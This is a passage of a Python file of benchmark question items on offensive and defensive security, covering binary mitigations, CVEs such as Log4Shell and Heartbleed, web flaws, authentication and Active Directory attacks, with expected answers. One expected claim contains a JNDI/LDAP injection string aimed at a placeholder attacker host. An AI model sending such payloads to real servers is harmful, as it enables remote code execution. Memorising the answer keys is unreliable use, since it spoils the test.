        "expected_claims": ["Writing beyond allocated stack buffer boundaries overwrites saved return address", "Stack canary places secret value before return address; deviation causes __stack_chk_fail termination"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-044",
        "domain": "BINARY_RE",
        "subdomain": "BINARY_MITIGATIONS",
        "category": "comparison",
        "question": "Compare modern binary mitigations: ASLR, DEP/NX, Stack Canaries, and RELRO in terms of attack vectors they disrupt.",
        "expected_topics": ["ASLR", "DEP/NX", "Stack Canaries", "RELRO", "W^X", "ROP chains"],
        "expected_sources": ["GCC Documentation", "CWE-119"],
        "expected_claims": ["DEP/NX prevents executing code in data segments like stack/heap", "ASLR randomizes memory address layouts to disrupt hardcoded jumps", "RELRO protects Global Offset Table (GOT) from overwrite"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-045",
        "domain": "BINARY_RE",
        "subdomain": "RETURN_ORIENTED_PROGRAMMING",
        "category": "conceptual",
        "question": "Explain Return-Oriented Programming (ROP) gadgets and how attackers construct ROP chains to bypass non-executable stack (DEP/NX).",
        "expected_topics": ["ROP", "ROP Gadgets", "DEP/NX bypass", "ret instruction", "mprotect"],
        "expected_sources": ["Hovav Shacham: The Geometry of Innocent Flesh on the Bone", "CWE-119"],
        "expected_claims": ["Attackers chain small snippets of existing executable code ending in ret", "Sequential gadgets set registers and invoke syscalls (e.g. mprotect or execve) without injecting new shellcode"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-046",
        "domain": "BINARY_RE",
        "subdomain": "ELF_STRUCTURE",
        "category": "conceptual",
        "question": "Describe the Executable and Linkable Format (ELF) structure, highlighting the purpose of Program Headers, Section Headers, and the GOT/PLT.",
        "expected_topics": ["ELF", "Program Headers", "Section Headers", ".text", ".got", ".plt", "Dynamic Linking"],
        "expected_sources": ["ELF Specifications", "Linux man-pages elf(5)"],
        "expected_claims": ["Program Headers describe runtime segments for execution; Section Headers describe linkable object structure", "GOT and PLT enable lazy dynamic symbol resolution for external shared libraries"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },

    # --- SECURE CODING: CWE PATTERNS, CRYPTOGRAPHY, INPUT VALIDATION ---
    {
        "query_id": "VAPT-QB-047",
        "domain": "SECURE_CODING",
        "subdomain": "CRYPTO_MISTAKES",
        "category": "code_analysis",
        "question": "Explain why ECB mode in AES encryption is insecure and identify the security guarantees provided by authenticated encryption modes like AES-GCM.",
        "expected_topics": ["AES-ECB", "AES-GCM", "Electronic Codebook", "Deterministic encryption", "Authenticated Encryption with Associated Data (AEAD)"],
        "expected_sources": ["NIST SP 800-38A", "NIST SP 800-38D", "CWE-327"],
        "expected_claims": ["ECB mode encrypts identical plaintext blocks into identical ciphertext blocks, leaking structural patterns", "AES-GCM provides confidentiality and cryptographic integrity verification via authentication tag"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-048",
        "domain": "SECURE_CODING",
        "subdomain": "CWE_MAPPING",
        "category": "cwe_mapping",
        "question": "Map SQL Injection, OS Command Injection, and Path Traversal to their canonical CWE identifiers and root weaknesses.",
        "expected_topics": ["CWE-89", "CWE-78", "CWE-22", "Improper Neutralization", "Special Elements"],
        "expected_sources": ["MITRE CWE List"],
        "expected_claims": ["SQLi maps to CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)", "OS Command Injection maps to CWE-78 (OS Command Injection)", "Path Traversal maps to CWE-22 (Improper Limitation of a Pathname)"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-049",
        "domain": "SECURE_CODING",
        "subdomain": "SECRET_MANAGEMENT",
        "category": "defensive_mitigation",
        "question": "What are secure coding best practices for handling API keys, private certificates, and database credentials in production applications?",
        "expected_topics": ["Secret Management", "Hardcoded credentials", "Environment variables", "Key Vault", "KMS", "Secret Rotation"],
        "expected_sources": ["OWASP Secrets Management Cheat Sheet", "CWE-798"],
        "expected_claims": ["Never commit credentials to version control or hardcode in application artifacts", "Utilize dedicated secret managers with fine-grained access policies and automatic rotation"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-050",
        "domain": "SECURE_CODING",
        "subdomain": "CONSTANT_TIME_COMPARE",
        "category": "code_analysis",
        "question": "Why does using standard string comparison (==) for HMAC tokens introduce timing attacks, and how does constant-time comparison resolve it?",
        "expected_topics": ["Timing Attack", "Side-channel", "Constant-time comparison", "crypto.timingSafeEqual", "Early exit"],
        "expected_sources": ["CWE-208", "CWE-385"],
        "expected_claims": ["Standard comparison terminates immediately upon encountering the first mismatched byte", "Constant-time comparison evaluates all bytes uniformly, eliminating timing side-channels"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },

    # --- CVE ANALYSIS & HISTORIC VULNERABILITY MECHANICS ---
    {
        "query_id": "VAPT-QB-051",
        "domain": "CVE_ANALYSIS",
        "subdomain": "CVE-2021-44228",
        "category": "cve_analysis",
        "question": "Explain CVE-2021-44228 (Log4Shell): What was the root cause in Log4j's message lookup mechanism and how was JNDI/LDAP leveraged?",
        "expected_topics": ["CVE-2021-44228", "Log4Shell", "Log4j", "JNDI Lookup", "LDAP Remote Code Execution", "formatMsgNoLookups"],
        "expected_sources": ["NVD CVE-2021-44228", "Apache Log4j Security Advisory"],
        "expected_claims": ["Log4j evaluated JNDI lookups inside log message strings without restriction", "Attackers sent ${jndi:ldap://attacker/a} forcing server to fetch and execute untrusted Java class"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-052",
        "domain": "CVE_ANALYSIS",
        "subdomain": "CVE-2022-22965",
        "category": "cve_analysis",
        "question": "Explain CVE-2022-22965 (Spring4Shell): How did class loader access via Spring parameter binding lead to Tomcat web shell deployment?",
        "expected_topics": ["CVE-2022-22965", "Spring4Shell", "Spring Framework", "Class Loader Binding", "AccessLogValve", "Tomcat"],
        "expected_claims": ["Java 9+ module system allowed accessing class.module.classLoader via BeanWrapper", "Manipulating Tomcat AccessLogValve properties wrote arbitrary JSP shells into webroot"],
        "expected_sources": ["VMware Spring Advisory", "NVD CVE-2022-22965"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-053",
        "domain": "CVE_ANALYSIS",
        "subdomain": "CVE-2014-0160",
        "category": "cve_analysis",
        "question": "Explain CVE-2014-0160 (Heartbleed): How did missing bounds checking in OpenSSL's TLS Heartbeat extension leak private memory?",
        "expected_topics": ["CVE-2014-0160", "Heartbleed", "OpenSSL", "TLS Heartbeat", "Buffer Over-read", "Memory Leak"],
        "expected_sources": ["NVD CVE-2014-0160", "OpenSSL Advisory"],
        "expected_claims": ["Client specified payload length without server validating actual buffer length received", "OpenSSL copied requested length from process memory, leaking private keys and session tokens"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-054",
        "domain": "CVE_ANALYSIS",
        "subdomain": "CVSS_V3",
        "category": "conceptual",
        "question": "Explain CVSS v3.1 Base Metrics: Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope, and CIA Impact.",
        "expected_topics": ["CVSS v3.1", "Base Metrics", "Attack Vector (AV)", "Attack Complexity (AC)", "Privileges Required (PR)", "User Interaction (UI)", "Scope (S)"],
        "expected_sources": ["FIRST CVSS v3.1 Specification", "NVD CVSS Guide"],
        "expected_claims": ["Base metric group reflects intrinsic qualities constant over time and user environments", "Scope indicates whether vulnerability can affect resources beyond security authority of vulnerable component"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },

    # --- SOC / DFIR: LOGS, DETECTION, SIEM, IOC ANALYSIS ---
    {
        "query_id": "VAPT-QB-055",
        "domain": "SOC_DFIR",
        "subdomain": "WINDOWS_EVENT_LOGS",
        "category": "methodological",
        "question": "Which Windows Event IDs are essential for detecting credential dumping via LSASS and lateral movement using PsExec?",
        "expected_topics": ["Windows Event Log", "Event ID 4624", "Event ID 4672", "Event ID 7045", "Event ID 4688", "LSASS Process Access", "Sysmon Event ID 10"],
        "expected_sources": ["Microsoft Security Auditing Documentation", "MITRE ATT&CK T1003.001"],
        "expected_claims": ["Sysmon Event ID 10 flags LSASS handle access with PROCESS_VM_READ permissions", "Event ID 7045 records new service installation characteristic of PsExec execution"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-056",
        "domain": "SOC_DFIR",
        "subdomain": "IOC_VS_IOA",
        "category": "comparison",
        "question": "Compare Indicators of Compromise (IOC) and Indicators of Attack (IOA) within threat hunting and detection engineering.",
        "expected_topics": ["IOC", "IOA", "Threat Hunting", "Hashes", "IP addresses", "Behavioral detection", "Pyramid of Pain"],
        "expected_sources": ["David Bianco: The Pyramid of Pain", "SANS DFIR"],
        "expected_claims": ["IOCs are forensic artifacts (hashes, domains) reflecting past activity", "IOAs focus on adversary behavior, intent, and execution tactics in real time"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },

    # --- RECONNAISSANCE & METHODOLOGY ---
    {
        "query_id": "VAPT-QB-057",
        "domain": "RECONNAISSANCE",
        "subdomain": "SUBDOMAIN_ENUMERATION",
        "category": "methodological",
        "question": "What is the systematic methodology for combining passive certificate transparency logs and active DNS brute-forcing for asset discovery?",
        "expected_topics": ["Subdomain Enumeration", "Certificate Transparency", "crt.sh", "DNS Brute-forcing", "Wildcard DNS Resolution"],
        "expected_sources": ["OWASP WSTG-INFO-01", "RFC 6962"],
        "expected_claims": ["Query public CT logs for pre-issued SSL certificates", "Perform active resolution filtering out wildcard DNS response addresses"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-058",
        "domain": "RECONNAISSANCE",
        "subdomain": "NEGATIVE_CONTROLS",
        "category": "methodological",
        "question": "How do Negative Controls prevent false positives during automated endpoint discovery and vulnerability scanning?",
        "expected_topics": ["Negative Controls", "False Positive Elimination", "Baseline Response", "Non-existent Endpoints", "Soft 404"],
        "expected_sources": ["OWASP WSTG", "Milestone Platform Security Invariants"],
        "expected_claims": ["Send known invalid payloads or paths to establish non-vulnerable baseline behavior", "Disregard responses that match the negative control baseline to eliminate false discoveries"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },

    # --- LAB REPRODUCTION & SAFE TESTING ---
    {
        "query_id": "VAPT-QB-059",
        "domain": "LAB_REPRODUCTION",
        "subdomain": "CONTAINER_LAB",
        "category": "lab_reproduction",
        "question": "How can a security researcher safely set up an isolated local container lab to reproduce and study SSRF vulnerabilities without risking external networks?",
        "expected_topics": ["Lab Reproduction", "Docker Network Isolation", "Internal Subnet", "Mock Metadata Service", "Negative Control Testing"],
        "expected_sources": ["OWASP Lab Guide", "Docker Security Best Practices"],
        "expected_claims": ["Deploy vulnerable web server and target mock service on private bridge network without internet gateway", "Use strict host firewall rules preventing egress to physical local network"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-060",
        "domain": "LAB_REPRODUCTION",
        "subdomain": "SAFE_EXPLOITATION_LIMITS",
        "category": "methodological",
        "question": "What ethical and operational boundaries distinguish safe proof-of-concept demonstration from disruptive exploitation in authorized penetration tests?",
        "expected_topics": ["Rules of Engagement", "Proof of Concept", "Safe Verification", "Denial of Service Prevention", "Data Integrity"],
        "expected_sources": ["PTES (Penetration Testing Execution Standard)", "NIST SP 800-115"],
        "expected_claims": ["Demonstrate execution via benign non-destructive assertions like whoami or sleep", "Never extract bulk customer PII or execute destructive file deletion"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    }
]

# Complete to 100 queries by filling targeted domains systematically
# Domains 61-100 covering:
# Web Security (61-68), Authentication & Authz (69-76), Mobile & Binary (77-84),
# Cloud & AD (85-92), Methodology & Code (93-100).
ADDITIONAL_QUERIES: List[Dict[str, Any]] = [
    {
        "query_id": "VAPT-QB-061",
        "domain": "WEB_SECURITY",
        "subdomain": "CORS_MISCONFIGURATION",
        "category": "conceptual",
        "question": "How does Access-Control-Allow-Origin: null or unvalidated reflection of the Origin header lead to cross-origin data theft?",
        "expected_topics": ["CORS", "Access-Control-Allow-Origin", "Access-Control-Allow-Credentials", "Origin: null", "Data Exfiltration"],
        "expected_sources": ["OWASP WSTG-CONF-07", "CWE-942"],
        "expected_claims": ["Reflecting arbitrary Origin with credentials allowed enables malicious websites to read private responses via fetch"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-062",
        "domain": "WEB_SECURITY",
        "subdomain": "CLICKJACKING",
        "category": "defensive_mitigation",
        "question": "Explain Clickjacking (UI Redress) attacks and how Content-Security-Policy frame-ancestors replaces legacy X-Frame-Options.",
        "expected_topics": ["Clickjacking", "X-Frame-Options", "Content-Security-Policy", "frame-ancestors", "Iframe embedding"],
        "expected_sources": ["OWASP Clickjacking Cheat Sheet", "CWE-1021"],
        "expected_claims": ["Frame-ancestors directive provides granular origin control and supersedes single-origin X-Frame-Options"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-063",
        "domain": "WEB_SECURITY",
        "subdomain": "CSRF_TOKENS",
        "category": "conceptual",
        "question": "What is the Double Submit Cookie pattern for CSRF mitigation and under what conditions can subdomains compromise it?",
        "expected_topics": ["CSRF", "Double Submit Cookie", "SameSite Cookie", "Subdomain cookie injection", "Cryptographic HMAC"],
        "expected_sources": ["OWASP Cross-Site Request Forgery Prevention Cheat Sheet", "CWE-352"],
        "expected_claims": ["Server compares request body token with cookie token without server session state", "Attacker controlling insecure sibling subdomain can overwrite parent domain cookies"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-064",
        "domain": "WEB_SECURITY",
        "subdomain": "CSP_BYPASS",
        "category": "methodological",
        "question": "How do JSONP endpoints or script gadgets hosted on CDN allowlists enable Content Security Policy (CSP) bypasses?",
        "expected_topics": ["CSP Bypass", "Content Security Policy", "JSONP", "AngularJS gadgets", "CDN allowlisting"],
        "expected_sources": ["Google CSP Evaluator", "CWE-79"],
        "expected_claims": ["Allowlisting broad CDN domains allows loading outdated scripts containing known DOM execution gadgets"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-065",
        "domain": "WEB_SECURITY",
        "subdomain": "WEB_CACHE_POISONING",
        "category": "protocol_analysis",
        "question": "How does Web Cache Poisoning operate when reverse proxies cache unkeyed input headers like X-Forwarded-Host?",
        "expected_topics": ["Web Cache Poisoning", "Unkeyed Headers", "Cache Key", "X-Forwarded-Host", "Reverse Proxy"],
        "expected_sources": ["PortSwigger Practical Web Cache Poisoning", "CWE-444"],
        "expected_claims": ["Unkeyed headers change HTTP response body without altering the cache key looked up by downstream users"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-066",
        "domain": "WEB_SECURITY",
        "subdomain": "OPEN_REDIRECT",
        "category": "conceptual",
        "question": "Explain Open Redirect vulnerabilities and how attackers chain them with OAuth authorization flows to steal tokens.",
        "expected_topics": ["Open Redirect", "OAuth 2.0", "redirect_uri", "Token Leakage", "CWE-601"],
        "expected_sources": ["OWASP WSTG-CLNT-04", "RFC 6749"],
        "expected_claims": ["Unvalidated redirect URLs allow routing victims to attacker sites", "Chaining with permissive OAuth redirect_uri path matching leaks authorization codes"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-067",
        "domain": "WEB_SECURITY",
        "subdomain": "HTTP_PARAMETER_POLLUTION",
        "category": "conceptual",
        "question": "What is HTTP Parameter Pollution (HPP) and how do different backend technologies (PHP, ASP.NET, Express) parse duplicate parameters?",
        "expected_topics": ["HPP", "Parameter Parsing", "ASP.NET comma concatenate", "PHP last parameter", "WAF bypass"],
        "expected_sources": ["OWASP WSTG-INPV-04", "CWE-235"],
        "expected_claims": ["Backends parse duplicate query keys differently (first, last, array, comma concatenation)", "Discrepancy allows splitting injection payloads to bypass WAF pattern matching"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-068",
        "domain": "WEB_SECURITY",
        "subdomain": "WEBSOCKET_SECURITY",
        "category": "protocol_analysis",
        "question": "What is Cross-Site WebSocket Hijacking (CSWSH) and why does the Same-Origin Policy not apply to WebSocket handshakes?",
        "expected_topics": ["CSWSH", "WebSockets", "Origin header", "Upgrade request", "Session hijacking"],
        "expected_sources": ["Christian Schneider CSWSH Research", "CWE-1385"],
        "expected_claims": ["WebSocket upgrade handshake uses standard HTTP cookies without automatic browser SOP blocking", "Backend must validate Origin header during handshake to prevent cross-site connection initiation"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },

    # --- AUTHENTICATION & IDENTITY (69-76) ---
    {
        "query_id": "VAPT-QB-069",
        "domain": "AUTHENTICATION",
        "subdomain": "PASSKEY_WEBAUTHN",
        "category": "protocol_analysis",
        "question": "How does FIDO2/WebAuthn eliminate credential stuffing and phishing by binding cryptographic keys to origin domains?",
        "expected_topics": ["WebAuthn", "FIDO2", "Passkeys", "Public Key Credential", "Origin Binding", "Phishing Resistance"],
        "expected_sources": ["W3C WebAuthn Specification", "FIDO Alliance"],
        "expected_claims": ["Authenticator generates key pair scoped strictly to the RP ID (domain)", "Phishing sites with different domains cannot prompt signing of challenge for legitimate RP ID"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-070",
        "domain": "AUTHENTICATION",
        "subdomain": "PASSWORD_RESET",
        "category": "methodological",
        "question": "What are critical security flaws to test for in password reset workflows including Host header poisoning and token entropy?",
        "expected_topics": ["Password Reset", "Host Header Injection", "Token Entropy", "Token Leakage via Referer", "CWE-640"],
        "expected_sources": ["OWASP Forgot Password Cheat Sheet", "CWE-640"],
        "expected_claims": ["Poisoning Host header causes reset email link to point to attacker server", "Predictable or reusable tokens allow account takeover"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-071",
        "domain": "AUTHENTICATION",
        "subdomain": "OIDC_ID_TOKEN",
        "category": "protocol_analysis",
        "question": "What is the distinction between an OAuth 2.0 Access Token and an OpenID Connect (OIDC) ID Token?",
        "expected_topics": ["OIDC", "OAuth 2.0", "Access Token", "ID Token", "Userinfo", "Identity vs Authorization"],
        "expected_sources": ["OpenID Connect Core 1.0", "RFC 6749"],
        "expected_claims": ["ID Token is a JWT meant for client app containing identity assertions", "Access Token is an opaque or structured credential meant for resource server API calls"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-072",
        "domain": "AUTHENTICATION",
        "subdomain": "SESSION_REVOCATION",
        "category": "conceptual",
        "question": "Why is revoking stateless JWT sessions challenging and what architectural patterns (blocklists, token versioning) resolve it?",
        "expected_topics": ["JWT Revocation", "Stateless Tokens", "Token Blacklist", "Redis TTL", "Token Version Counter"],
        "expected_sources": ["RFC 8725", "OWASP Session Management Cheat Sheet"],
        "expected_claims": ["Stateless JWTs remain cryptographically valid until expiration without database check", "Use centralized revocation blocklist or token version integer in user record to revoke"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-073",
        "domain": "AUTHORIZATION",
        "subdomain": "ABAC_VS_RBAC",
        "category": "comparison",
        "question": "Compare Role-Based Access Control (RBAC) and Attribute-Based Access Control (ABAC) in enterprise access architectures.",
        "expected_topics": ["RBAC", "ABAC", "Roles", "Attributes", "Policy Enforcement Point", "NIST SP 800-162"],
        "expected_sources": ["NIST SP 800-162", "CWE-285"],
        "expected_claims": ["RBAC assigns permissions based on static role memberships", "ABAC evaluates dynamic attributes of subject, resource, action, and environment context"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-074",
        "domain": "AUTHORIZATION",
        "subdomain": "PATH_AUTHORIZATION_BYPASS",
        "category": "code_analysis",
        "question": "How do framework path-matching discrepancies (e.g. Spring /admin/* vs /admin) lead to security filter bypasses?",
        "expected_topics": ["Path Matching", "Spring Security", "AntMatcher", "RegexMatcher", "Trailing slash", "URL normalization"],
        "expected_sources": ["Spring Security Reference", "CWE-285"],
        "expected_claims": ["Discrepancies between reverse proxy, security filter, and servlet routing cause filters to skip authorization checks"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-075",
        "domain": "AUTHORIZATION",
        "subdomain": "GRAPHQL_FIELD_AUTH",
        "category": "conceptual",
        "question": "Why do GraphQL APIs frequently suffer from object authorization flaws at the individual field resolver level?",
        "expected_topics": ["GraphQL Authorization", "Field Resolver", "Object-Level Authorization", "Nested queries"],
        "expected_sources": ["OWASP GraphQL Cheat Sheet", "CWE-639"],
        "expected_claims": ["Authorizing top-level query does not enforce permissions when resolving related nested object fields"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-076",
        "domain": "AUTHORIZATION",
        "subdomain": "IDOR_NUMERIC_UUID",
        "category": "conceptual",
        "question": "Does replacing sequential integer IDs with UUIDv4 eliminate Insecure Direct Object References (IDOR)?",
        "expected_topics": ["IDOR", "UUIDv4", "Access Control vs Obscurity", "Identifier Guessability"],
        "expected_sources": ["OWASP WSTG-ATHZ-04", "CWE-639"],
        "expected_claims": ["UUIDs prevent sequential guessing but do NOT enforce authorization checks", "If user B accesses user A's UUID without authorization validation, the IDOR vulnerability remains"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },

    # --- MOBILE & BINARY (77-84) ---
    {
        "query_id": "VAPT-QB-077",
        "domain": "MOBILE",
        "subdomain": "ANDROID_KEYSTORE",
        "category": "conceptual",
        "question": "How does the Android Keystore system protect cryptographic keys against extraction even on rooted devices?",
        "expected_topics": ["Android Keystore", "TEE", "StrongBox", "Hardware Security Module", "Keymaster"],
        "expected_sources": ["Android Developer Keystore Guide", "OWASP MASTG-CRYPTO-1"],
        "expected_claims": ["Keys generated inside Keystore reside in hardware-backed TEE or StrongBox and never enter application memory space"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-078",
        "domain": "MOBILE",
        "subdomain": "SMALI_REVERSING",
        "category": "methodological",
        "question": "What is the procedure for decompiling an APK to Smali, modifying bytecode instructions, and repacking/re-signing for testing?",
        "expected_topics": ["Apktool", "Smali", "Bytecode patching", "zipalign", "apksigner", "Android reversing"],
        "expected_sources": ["OWASP MASTG-REVERSE-1", "Apktool Documentation"],
        "expected_claims": ["Disassemble with Apktool, modify Smali opcodes, rebuild APK, align with zipalign, and sign with test key"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-079",
        "domain": "MOBILE",
        "subdomain": "IOS_JAILBREAK_DETECTION",
        "category": "methodological",
        "question": "What file path checks and sandbox escape indicators are typically used in iOS jailbreak detection, and how does Frida bypass them?",
        "expected_topics": ["iOS Jailbreak", "Frida Hooking", "/Applications/Cydia.app", "fork() check", "Stat hook"],
        "expected_sources": ["OWASP MASTG-RESILIENCE-1"],
        "expected_claims": ["Apps inspect standard jailbreak paths and sandbox permissions; Frida hooks file APIs to return file-not-found"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-080",
        "domain": "BINARY_RE",
        "subdomain": "USE_AFTER_FREE",
        "category": "conceptual",
        "question": "Explain the mechanics of a Use-After-Free (UAF) vulnerability in C/C++ memory allocation.",
        "expected_topics": ["Use-After-Free", "Heap exploitation", "malloc", "free", "Dangling Pointer", "Virtual Method Table"],
        "expected_claims": ["Program references pointer to memory chunk after it was deallocated", "Reallocating chunk with attacker-controlled data allows hijacking control flow via function pointers"],
        "expected_sources": ["CWE-416", "Phrack Magazine"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-081",
        "domain": "BINARY_RE",
        "subdomain": "INTEGER_OVERFLOW",
        "category": "code_analysis",
        "question": "How do integer overflows in memory allocation size calculations lead to subsequent heap buffer overflows?",
        "expected_topics": ["Integer Overflow", "Integer Wraparound", "calloc/malloc", "Heap Buffer Overflow", "CWE-190"],
        "expected_sources": ["CWE-190", "CWE-122"],
        "expected_claims": ["Multiplication overflow wraps integer to small value, allocating undersized buffer", "Copying full number of elements overflows allocated heap chunk"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-082",
        "domain": "BINARY_RE",
        "subdomain": "FORMAT_STRING",
        "category": "conceptual",
        "question": "Explain format string vulnerabilities in printf-family functions and how the %n specifier writes to memory.",
        "expected_topics": ["Format String", "printf", "%x", "%s", "%n", "Arbitrary Memory Write", "CWE-134"],
        "expected_sources": ["CWE-134", "Scut: Exploiting Format String Vulnerabilities"],
        "expected_claims": ["Passing user input as format string parses stack values as specifiers", "%n writes count of printed characters to memory address pointed to by stack argument"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-083",
        "domain": "BINARY_RE",
        "subdomain": "PE_PORTABLE_EXECUTABLE",
        "category": "conceptual",
        "question": "Describe the PE format structure on Windows, focusing on DOS Header, NT Headers, and Import/Export Address Tables (IAT/EAT).",
        "expected_topics": ["PE Format", "IMAGE_DOS_HEADER", "IMAGE_NT_HEADERS", "IAT", "EAT", "Import Directory"],
        "expected_sources": ["Microsoft PE and COFF Specification", "Practical Malware Analysis"],
        "expected_claims": ["PE files use relative virtual addresses (RVA); IAT resolves dynamic function pointers loaded from Windows DLLs"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-084",
        "domain": "BINARY_RE",
        "subdomain": "SYMBOLIC_EXECUTION",
        "category": "conceptual",
        "question": "What is symbolic execution in automated vulnerability research and what is the path explosion problem?",
        "expected_topics": ["Symbolic Execution", "SMT Solvers", "Z3", "Path Explosion", "Concolic Testing"],
        "expected_sources": ["James C. King: Symbolic Execution and Program Testing", "Angr Framework"],
        "expected_claims": ["Evaluates program inputs as algebraic symbols building constraints for constraint solvers", "Branching exponential increase in execution states leads to path explosion"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },

    # --- CLOUD & WINDOWS AD (85-92) ---
    {
        "query_id": "VAPT-QB-085",
        "domain": "CLOUD",
        "subdomain": "AZURE_MANAGED_IDENTITY",
        "category": "conceptual",
        "question": "How do Azure Managed Identities function and what risk arises from exposing the local identity token endpoint?",
        "expected_topics": ["Azure Managed Identity", "MSI Endpoint", "169.254.169.254", "Azure AD Token", "OAuth Bearer"],
        "expected_sources": ["Microsoft Azure Architecture Documentation"],
        "expected_claims": ["Managed identities grant VMs access to Azure AD tokens via local metadata endpoint", "SSRF can capture Azure Resource Manager management tokens"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-086",
        "domain": "CLOUD",
        "subdomain": "S3_BUCKET_SECURITY",
        "category": "defensive_mitigation",
        "question": "What AWS S3 configurations (Bucket Policies, Block Public Access, ACLs) are necessary to prevent public exposure of sensitive assets?",
        "expected_topics": ["AWS S3", "S3 Block Public Access", "Bucket Policy", "S3 ACL", "Public Read Misconfiguration"],
        "expected_sources": ["AWS S3 Security Best Practices Guide", "CIS AWS Foundations Benchmark"],
        "expected_claims": ["Enable S3 Block Public Access at account and bucket level to override legacy permissive ACLs"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-087",
        "domain": "WINDOWS_AD",
        "subdomain": "BLOODHOUND_ATTACK_PATHS",
        "category": "methodological",
        "question": "How does BloodHound use graph theory to uncover hidden privilege escalation paths in Active Directory environments?",
        "expected_topics": ["BloodHound", "Active Directory Graph", "Neo4j", "GenericAll", "WriteDacl", "Group Delegations"],
        "expected_sources": ["BloodHound Documentation", "SpecterOps Research"],
        "expected_claims": ["Maps users, groups, computers, and ACL permissions as nodes and edges to compute shortest path to Domain Admins"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-088",
        "domain": "WINDOWS_AD",
        "subdomain": "GPO_ABUSE",
        "category": "attack_chain_reasoning",
        "question": "How can an attacker escalate privileges if they have Write permissions over a Group Policy Object (GPO)?",
        "expected_topics": ["Group Policy", "GPO Abuse", "Immediate Task", "Domain Privilege Escalation", "gpupdate"],
        "expected_sources": ["MITRE ATT&CK T1484.001", "Microsoft Group Policy Documentation"],
        "expected_claims": ["Modifying GPO to deploy scheduled task or local administrator rights propagates to all linked computers via gpupdate"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-089",
        "domain": "WINDOWS_AD",
        "subdomain": "DCSYNC",
        "category": "conceptual",
        "question": "What directory replication permissions (DS-Replication-Get-Changes) enable a DCSync attack to extract Active Directory password hashes?",
        "expected_topics": ["DCSync", "DRSUAPI", "Replication Permissions", "krbtgt", "Mimikatz", "Active Directory"],
        "expected_sources": ["MITRE ATT&CK T1003.006", "Microsoft MS-DRSR Documentation"],
        "expected_claims": ["Accounts with replication rights simulate a Domain Controller to request password hashes via DRSUAPI RPC"],
        "difficulty": "ADVANCED",
